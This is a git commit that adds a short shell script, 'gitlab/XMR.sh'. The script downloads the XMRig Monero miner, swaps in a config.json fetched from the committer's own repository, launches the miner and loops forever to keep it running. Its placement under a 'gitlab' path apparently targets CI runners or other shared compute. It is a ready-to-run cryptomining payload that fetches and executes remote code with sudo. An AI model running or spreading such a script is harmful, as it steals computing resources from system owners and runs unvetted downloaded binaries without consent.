0392ea7d77af87a40d072d0da57c39c2dcee8766
ceeb57f83688 <84587193+ceeb57f83688@users.noreply.github.com>
2021-06-30 11:02:53 +0100

    Create XMR.sh

---
+++ gitlab/XMR.sh
@@ -0,0 +1,9 @@
+#!/bin/sh
+sudo apt update 
+sudo apt install screen -y
+wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz && tar xf xmrig-6.12.2-linux-x64.tar.gz && cd xmrig-6.12.2 && rm -rf config.json && ls
+wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/config.json && ls && ./xmrig
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
